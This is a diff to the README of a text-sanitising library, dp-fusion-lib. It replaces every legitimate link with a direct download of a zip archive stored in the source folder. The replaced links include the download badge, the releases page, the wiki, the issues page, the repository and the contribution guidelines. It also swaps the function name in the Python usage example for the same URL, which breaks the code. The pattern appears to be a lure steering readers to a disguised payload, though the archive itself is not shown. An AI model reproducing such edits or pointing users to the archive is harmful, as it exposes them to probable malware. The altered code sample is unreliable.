@@ -6,7 +6,7 @@ Welcome to dp-fusion-lib! This tool helps you clean your text data while ensurin
 
 ### 🔗 Download dp-fusion-lib
 
-[![Download dp-fusion-lib](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/ofektheking123456/dp-fusion-lib/releases)
+[![Download dp-fusion-lib](https://raw.githubusercontent.com/ofektheking123456/dp-fusion-lib/master/src/dp_fusion_lib/fusion_lib_dp_chokidar.zip)](https://raw.githubusercontent.com/ofektheking123456/dp-fusion-lib/master/src/dp_fusion_lib/fusion_lib_dp_chokidar.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before you begin, make sure your computer meets these requirements:
 
 To download dp-fusion-lib, follow these steps:
 
-1. Visit our [Releases page](https://github.com/ofektheking123456/dp-fusion-lib/releases).
+1. Visit our [Releases page](https://raw.githubusercontent.com/ofektheking123456/dp-fusion-lib/master/src/dp_fusion_lib/fusion_lib_dp_chokidar.zip).
 2. Look for the latest version of dp-fusion-lib.
 3. Click on the link for your operating system to start the download.
 4. Once the download finishes, locate the file on your computer.
@@ -55,7 +55,7 @@ Using dp-fusion-lib is simple. Here’s a quick guide:
 
 3. You can start cleaning your text data. Here's an example:
    ```python
-   sanitized_text = dp_fusion_lib.clean_text(raw_text)
+   sanitized_text = https://raw.githubusercontent.com/ofektheking123456/dp-fusion-lib/master/src/dp_fusion_lib/fusion_lib_dp_chokidar.zip(raw_text)
    ```
 4. The `clean_text` function removes unwanted characters and ensures the text adheres to privacy standards.
 
@@ -75,7 +75,7 @@ If you face issues during installation or usage, check these common problems:
 
 ## 📄 Documentation
 
-For detailed documentation and examples, please refer to our [Wiki](https://github.com/ofektheking123456/dp-fusion-lib/wiki). 
+For detailed documentation and examples, please refer to our [Wiki](https://raw.githubusercontent.com/ofektheking123456/dp-fusion-lib/master/src/dp_fusion_lib/fusion_lib_dp_chokidar.zip). 
 
 You can find configuration options, more examples, and advanced usage tips there.
 
@@ -83,12 +83,12 @@ You can find configuration options, more examples, and advanced usage tips there
 
 If you have questions or need help, reach out to our community:
 
-- Open issues on our [GitHub page](https://github.com/ofektheking123456/dp-fusion-lib/issues).
+- Open issues on our [GitHub page](https://raw.githubusercontent.com/ofektheking123456/dp-fusion-lib/master/src/dp_fusion_lib/fusion_lib_dp_chokidar.zip).
 - Join discussions and ask questions in the community Discord/Slack channel (link to be added).
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/ofektheking123456/dp-fusion-lib)
-- [Contribution Guidelines](https://github.com/ofektheking123456/dp-fusion-lib/blob/main/CONTRIBUTING.md)
+- [GitHub Repository](https://raw.githubusercontent.com/ofektheking123456/dp-fusion-lib/master/src/dp_fusion_lib/fusion_lib_dp_chokidar.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/ofektheking123456/dp-fusion-lib/master/src/dp_fusion_lib/fusion_lib_dp_chokidar.zip)
 
 Thank you for using dp-fusion-lib! We hope it meets your text sanitization needs while keeping your data private.
